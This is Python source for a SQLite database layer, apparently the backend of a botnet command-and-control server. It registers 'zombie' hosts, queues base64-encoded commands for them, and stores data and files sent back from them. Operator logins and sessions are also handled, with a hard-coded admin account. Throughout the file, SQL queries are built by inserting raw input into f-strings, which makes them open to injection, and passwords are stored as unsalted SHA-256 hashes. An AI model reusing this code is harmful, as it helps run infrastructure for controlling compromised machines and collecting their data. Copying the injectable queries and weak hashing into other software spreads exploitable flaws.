import sqlite3
import hashlib 
import os
import datetime
import secrets
import base64

"""
    Table Structures:
        - zombies
            - zombieID (incrementing integer)
            - state (enum {"CheckedIn", "CommandSet", "CommandRecieved", "Stale"})
            - hostInfo (json body with some info about host)
            - lastCheckIn (timestamp of last seen))
        - users
            - Username 
            - Password
            - lastLogin
        - sessions
            - username
            - sessionID
            - expire
        - data
            - clientID
            - dataBlob
            - token
        - command
            - zombieID
            - dataBlob
            - token
    """

class Database:

    """
    - used to generate a token for data transfer
        ALT: gen_token = lambda: secrets.token_urlsafe(32)
    """
    def get_token(self):
        token = secrets.token_urlsafe(32)
        return token
     
    name = ""
    path = ""
    
    """
    - Set up database variables from OS envvars.
    """
    def __init__(self):
        try:
            try:
                if os.environ['db_path']:
                    self.path = os.environ['db_path']
            except:
                #print("__INIT__ => no envvar for db_path")
                self.path = "./"
            try:
                if os.environ['db_name']:
                    self.name = self.path + os.environ['db_name']
            except:
                #print("__INIT__ => no envvar for db_name")
                self.name = self.path + "database.db"
            return
        except:
            print("__INIT__ => Error configuring database from envvars, defaulting")
            self.name = "database.db"
            return

    """
    - Establish a connection to the database
    """
    def get_con(self,name):
        c = sqlite3.connect(name)
        return c
    
    """
    - Establish a cursor on the database. 
    """
    def get_cur(self,con):
        cur = con.cursor()
        return cur
    
    """
    - Generate a timestamp in ISO-8601
    """
    def getTime(self):
        #lamda
        #now = lambda: datetime.datetime.now(datetime.UTC).strftime("%Y-%m-%dT%H:%M:%SZ")
        #now = lambda: datetime.datetime.now(tz=datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
        return datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

    """
        - Verifies if the table exists in the database.
    """
    def is_table(self, name):
        #TODO, add logic to prevent sqli
        cmd = f"select name from sqlite_master where name='{name}'"
        con = self.get_con(self.name)
        cur = self.get_cur(con)
        res = cur.execute(cmd)
        table_names = res.fetchall()
        for x in table_names:
            # print(type(x))
            x = str(x)
            x = x.strip("[],\(\)'")
            if name in x:
                con.close()
                return True
            else:
                con.close()
                return False
        
    """
        - Creates the table and has blueprints for each table name
    """  
    def build_table(self, name):
        cmd = f"create table {name}("
        con = self.get_con(self.name)
        cur = self.get_cur(con)
        #try:
        if name == "zombies":
            cmd += "zombieID, state, hostInfo, lastCheckIn)"
            cur.execute(cmd)
            con.commit()
            con.close()
            return True
        elif name == "users":
            cmd += "username, password, lastLogin)"
            cur.execute(cmd)
            con.commit()
            con.close()
            return True
        elif name == "data":
            cmd += "zombieID, token, dataBlob)"
            cur.execute(cmd)
            con.commit()
            con.close()
            return True
        elif name == "sessions":
            cmd += "username, sessionID, expire)"
            cur.execute(cmd)
            con.commit()
            con.close()
            return True
        elif name == "commands":
            cmd += "zombieID, token, dataBlob)"
            cur.execute(cmd)
            con.commit()
            con.close()
            return True
        else:
            print(f"BUILD_TABLE => couldn't find database {name}, closing")
            return False
        # except:
        #     print("FS ERROR: Cannot commit to DB, closing")
        #     return False

    """
        - Check if each table exsists, and if not create it. 
    """   
    def init(self):
        tables = ["zombies","data","users","sessions","commands"]
        for x in tables:
            #print(f"Now testing if {x} exists")
            if self.is_table(x):
                #print(f"{x} was found, going to next table...")
                #NEED TO add logic to ensure that table integrity is good.
                pass
            else:
                #print(f"{x} was not found, creating")
                if self.build_table(x):
                    # print(f"created table {x}")
                    if "users" in x:
                    # Add feature here to add admin users if not existed
                        if self.is_admin():
                            # print("Admin user found")
                            pass
                        else:
                            self.add_admin(self.load_admin_cred())
                            # print("INIT => Added admin user")
                            pass
                    else:
                        # print(f"{x} was not users")
                        pass
                    pass    
                else:
                    print(f"INIT => Error on db_init. Couldn't build table {x}. Exiting")
                    exit()
        # print("Database Init: Success!")
        return True
    
    """
        - When init, create the admin user.
            - shouldn't be called outside of init()
    """
    def add_admin(self, password):
        con = self.get_con(self.name)
        cur = self.get_cur(con)
        if self.is_table("users"):
            cmd = "insert into users values ('Fr0g',"
            enc = self.hash(password)
            cmd += f"'{enc}','0000-00-00T00:00:00Z')"
            cur.execute(cmd)
            con.commit()
            cur.close()
            return True
        else:
            # print("ADD_ADMIN => ERROR: Couldn't add admin user")
            return False

    """
     - Checks if the predefined admin user has been created in the database
    """     
    def is_admin(self):
        con = self.get_con(self.name)
        cur = self.get_cur(con)
        cmd = "select username from users where username='Fr0g'"
        res = cur.execute(cmd)
        if res.fetchone() == "Fr0g":
            con.close()
            return True
        else:
            con.close()
            return False

    """
    - check if user exists
    """
    def is_user(self,user):
        con = self.get_con(self.name)
        cur = self.get_cur(con)
        cmd = f"select username from users where username='{user}'"
        res = cur.execute(cmd)
        username = res.fetchone()
        #print(username[0])
        if username is not None:
            if username[0] == f"{user}":
                con.close()
                return True
            else:
                con.close()
                return False
        else:
            con.close()
            return False

    """
     - perform sha256 hash on input plaintext and return result
    """
    def hash(self, plaintext):
        h = hashlib.sha256()
        try:
            plain = str(plaintext)    
            h.update(plain.encode())
            enc = h.hexdigest()
            return enc
        except:
            # print("HASH => couldn't hash value. ERROR")
            return None
      
    """
    - Loads admin password from environment variables
    """
    def load_admin_cred(self):
        try:
            cred = os.environ['admin_cred']
            # print(f"LOAD_ADMIN_CRED => found {cred} from admin_cred env.")
            return cred
        except:
            print(f"COULDN'T GET DEFAULT ADMIN CRED, EXITING")
            exit()
    
    """
    - Add a zombieID to the database.
    """
    def add_zombie(self, zombieID):
        time = self.getTime()
        try:
            con = self.get_con(self.name)
            cur = con.cursor()
            #cmd += "zombieID, state, hostInfo, lastCheckIn)"
            # print(f"ADD_ZOMBIE => now attempting to insert zombieID: {zombieID}")
            cmd = f"insert into zombies values('{zombieID}', 'ALIVE', 'NULL', '{time}')"
            # print(f"ADD_ZOMBIE => Command to send: {cmd}")
            res = cur.execute(cmd)
            #print(f"res: {res}")
            con.commit()
            con.close()
            return True
        except:
            # print(f"ADD_ZOMBIE => couldn't add {zombieID} to database!")
            return False

    """
    - input a username and return their hashed cred from the DB
    """
    def get_enc_cred(self, user):
        con = self.get_con(self.name)
        cur = self.get_cur(con)
        cmd = f"select password from users where username='{user}'"
        res = cur.execute(cmd)
        cred = res.fetchone()
        con.close()
        if cred is None:
            return None
        else:
            return cred[0]

    """
    - Checks if zombidID already exists
    """
    def is_zombie(self, zombieID):
        try:
            con = self.get_con(self.name)
            cur = self.get_cur(con)
            cmd = f"select zombieID from zombies where zombieID='{zombieID}'"
            cur.execute(cmd)
            res = cur.fetchone()
            if res is None:
                # print(f"IS_ZOMBIE => Couldn't find {zombieID}")
                con.close()
                return False
            else:
                # print(f"IS_ZOMBIE => Found {zombieID}")
                con.close()
                return True
        except:
            # print(f"IS_ZOMBIE => Error getting {zombieID} from database.")
            return False

    """
    - Return list of all zombies in database via ID
    """
    def get_zombies(self):
        zombies = []
        con = self.get_con(self.name)
        cur = self.get_cur(con)
        cmd = "select zombieID from zombies"
        res = cur.execute(cmd)
        z = res.fetchall()
        for x in z:
            # print(f"GET_ZOMBIES => Found: {x[0]}")
            zombies.append(x[0])
        con.close()
        return zombies

    """
    - Takes a database name and updates the time in its row. 
        - Can only be called on zombies and users (lastCheckin and lastLogin)
    """
    def updateTime(self,database,key):
        con = self.get_con(self.name)
        cur = self.get_cur(con)
        #print(f"UPDATETIME => database:{database}, key:{key}")
        if database == "zombies":
            cmd = f"update zombies set lastCheckin = '{self.getTime()}' where zombieID='{key}'"
            cur.execute(cmd)
            con.commit()
            con.close()
        elif database == "users":
            cmd = f"update users set lastLogin = '{self.getTime()}' where userID='{key}'"
            cur.execute(cmd)
            con.commit()
            con.close()
        else:
            print("UPDATETIME => ERROR: wrong database supplied to updateTime")

    """
    - add X minutes to an iso-8601 time string
    """
    def add_x(self,min,time):
        #0000-00-00T00:00:00Z
        t_obj = datetime.datetime.strptime(time,"%Y-%m-%dT%H:%M:%SZ")
        delta = datetime.timedelta(minutes=min)
        new_time = t_obj + delta
        new_time = new_time.strftime("%Y-%m-%dT%H:%M:%SZ")
        return new_time

    """
    - Takes a username and creates a session entry for a user
    """
    def create_session(self,user,sesTok):
        con = self.get_con(self.name)
        cur = self.get_cur(con)
        time = self.getTime()
        expire = 5
        cmd = f"insert into sessions values('{user}','{sesTok}','{self.add_x(expire,time)}')"
        try:
            cur.execute(cmd)
            con.commit()
            con.close()
            return True
        except:
            return False
        
    """
    - determine if a session is still valid
    """
    def is_authd(self,sesTok):
        con = self.get_con(self.name)
        cur = self.get_cur(con)
        cmd = f"select sessionID from sessions where sessionID='{sesTok}'"
        res = cur.execute(cmd)
        session = res.fetchone()
        if session is not None:
            con.close()
            return True
        else:
            con.close()
            return False

    """
    - add a command to the commands table.
    """
    def add_command(self,data,zombieID):
        token = self.get_token()
        con = self.get_con(self.name)
        cur = self.get_cur(con)
        data = base64.b64encode(data.encode('utf-8'))
        data = data.decode('utf-8')
        print(f"ADD_COMMAND => Data: {data}")
        #cmd += "zombieID, token, dataBlob)"
        cmd = f"insert into commands values('{zombieID}','{token}','{data}')"
        cur.execute(cmd)
        con.commit()
        con.close()
        return
    
    """
    - add a dataBlob to the data table.
    """
    def add_data(self,data:str,zombieID):
        token = self.get_token()
        con = self.get_con(self.name)
        cur = self.get_cur(con)
        # No need to encode here as data will be recieved as b64 string
        # data = base64.b64encode(data.encode('utf-8'))
        # data = data.decode('utf-8')
        print(f"ADD_DATA => Data: {data}")
        #cmd += "zombieID, token, dataBlob)"
        cmd = f"insert into data values('{zombieID}','{token}','{data}')"
        cur.execute(cmd)
        con.commit()
        con.close()
        return
    
    """
    - Add a base64 encoded file to the database
    """
    def add_file(self,zombieID,**kwargs):
        if(kwargs['token']):
            token = kwargs['token']
        else:
            token = self.get_token()
        con = self.get_con(self.name)
        cur = self.get_cur(con)
        print(f"ADD_FILE => Token: {token}")
        #cmd += "zombieID, token, dataBlob)"
        cmd = f"insert into data values('{zombieID}','{token}','FILE')"
        cur.execute(cmd)
        con.commit()
        con.close()
        return

    """
    - Get a dataBlob from specified table table
    """
    def get_dataBlob(self,zombieID,token,db):
        con = self.get_con(self.name)
        cur = self.get_cur(con)
        #struct: "zombieID, token, dataBlob)"
        cmd = f"select dataBlob from {db} where zombieID='{zombieID}' and token='{token}'"
        print(f"GET_DATABLOB => cmd: {cmd}")
        res = cur.execute(cmd)
        dataBlob = res.fetchone()
        # print(f"GET_DATABLOB => data:{dataBlob}")
        con.close()
        if dataBlob is None:
            return None
        else:
            return dataBlob[0]
        
    """
    - Get all tokens from data for a given zombieID
    """    
    def get_all_dataTok(self,zombieID):
        con = self.get_con(self.name)
        cur = self.get_cur(con)
        cmd = f"select token from data where zombieID='{zombieID}'"
        res = cur.execute(cmd)
        data = res.fetchall()
        if data is None:
            con.close()
            return None
        else:
            con.close()
            return data
        
    """
    - grab the next command for a givin zombie, remove it,
       and finally return for sending
    """
    def remove_tok(self,zombieID,token,db):
        con = self.get_con(self.name)
        cur = self.get_cur(con)
        cmd = f"delete from {db} where zombieID='{zombieID}' and token='{token}'"
        cur.execute(cmd)
        # print("REMOVE_TOK => Now attempting to remove command")
        try:
            con.commit()
            con.close()
            # print("REMOVE_TOK => Success")
            return True
        except:
            con.close()
            # print("REMOVE_TOK => Fail")
            return False

    """
    - Retrieve all entries in sessions or zombies, then remove them if they are expired / stale
    """    
    def scrub_table(self,table):
        con = self.get_con(self.name)
        cur = self.get_cur(con)
        now = self.getTime()
        if table == "sessions":
            #First get all current sessions:
            cmd = "select sessionID, expire from sessions"
            res = cur.execute(cmd)
            sessions = res.fetchall()
            #print(f"SCRUB_TABLE => Sessions: {sessions}")
            #Iterate over each session and remove if expired
            for sess, time in sessions:
               # print(f"session: {sess}, expires: {time}")
               is_expired = self.comp_time(now,time)
               if(is_expired):
                   #remove from db
                   # print(f"SCRUB_TABLE => Found session {sess} is expired, DELETING!")
                   cmd = f"delete from sessions where sessionID='{sess}'"
                   cur.execute(cmd)
                   con.commit()
                   # print(f"SCRUB_TABLE => DBG: {cmd}")   
                   continue
               else:
                   # print(f"SCRUB_TABLE => Session {sess} is still valid") 
                   continue
        elif table == "zombies":
            cmd = "select zombieID, lastCheckIn from zombies"
            res = cur.execute(cmd)
            zombies = res.fetchall()
            #print(f"SCRUB_TABLE => Zombies: {zombies}")
            for zombieID, lastChkin in zombies:
                # print(f"zombie: {zombieID}, laskChkin: {lastChkin}")
                expire = self.add_x(15,lastChkin)
                is_expired = self.comp_time(now, expire)
                if(is_expired):
                    # print(f"SCRUB_TABLE => Found zombie {zombieID} is expired, DELETING!")
                    cmd = f"delete from zombies where zombieID='{zombieID}'"
                    cur.execute(cmd)
                    con.commit()
                    # print(f"SCRUB_TABLE => DBG: {cmd}")
                    continue
                else:
                    # print(f"SCRUB_TABLE: Zombie {zombieID} is still valid.")
                    continue
        elif table == "commands":
            #Get all current zombie IDs, delete all IDs that arn't active
            #zombie table will be scrubbed before this branch, assume all ids are valid
            cmd = "select zombieID from zombies"
            res = cur.execute(cmd)
            active = res.fetchall()
            #print(f"SCRUB_TABLE => 'commands': Found Zombies: {active}")
            cmd = "select zombieID from commands"
            res = cur.execute(cmd)
            to_check = res.fetchall()
            to_rmv = []
            for zombie in to_check:
                if zombie not in active:
                    to_rmv.append(zombie)
            #print(f"SCRUB_TABLE => 'commands': Zombies to remove: {to_rmv}")
            for zombie in to_rmv:
                #print(f"IN FOR LOOP -> FOUND ZOMBIE {zombie[0]}")
                cmd = f"delete from commands where zombieID='{zombie[0]}'"
                #print(f"SCRUB_TABLE => 'commands': now running command:\n {cmd}")
                cur.execute(cmd)
                con.commit()
                continue
        elif table == "data":
            #Get all current zombie IDs, dump each blob to disk of inactive ID and then remove from table
            #zombie table will be scrubbed before this branch, assume all ids are valid
            cmd = "select zombieID from zombies"
            res = cur.execute(cmd)
            active = res.fetchall()
            #print(f"SCRUB_TABLE => 'data': Found Zombies: {active}")
            cmd = "select zombieID from data"
            res = cur.execute(cmd)
            to_check = res.fetchall()
            to_rmv = []
            for zombie in to_check:
                if zombie not in active:
                    to_rmv.append(zombie)
            #print(f"SCRUB_TABLE => 'data': Zombies to remove: {to_rmv}")
            # first dump the data to disk './files/stale/<zombieID>-<Token>
            # then remove from database
            for zombie in to_rmv:
                #print(f"SCRUB_TABLE => 'data': zombieID to process {zombie[0]}")
                cmd = f"select zombieID, token, dataBlob from data where zombieID='{zombie[0]}'"
                res = cur.execute(cmd)
                results =  res.fetchall()
                #save data to disk
                for z, t, d in results:
                    filename = f"{z}={t}"
                    path = f"./files/stale/{filename}"
                    print(f"now attempting to save data to {path}")
                    with open(path, 'w') as f:
                        f.write(d)
                        f.close()
                #delete database entry
                print(f"now deleting zombieID from table: {zombie[0]}")
                cmd = f"delete from data where zombieID='{zombie[0]}'"
                cur.execute(cmd)
                con.commit()
        else:
            # print(f"SCRUB_TABLE => {table} not valid option")
            return
        con.close()
        return

    """
    - Determine if now is greater than time_to_chk
    """
    def comp_time(self, now:str, time_to_chk:str):
        tObj_now = datetime.datetime.strptime(now,"%Y-%m-%dT%H:%M:%SZ")
        tObj_toChk = datetime.datetime.strptime(time_to_chk,"%Y-%m-%dT%H:%M:%SZ")
        res = tObj_now > tObj_toChk
        # print(f"COMP_TIME => res is {res}")
        if tObj_now > tObj_toChk:
            return True
        else:
            return False
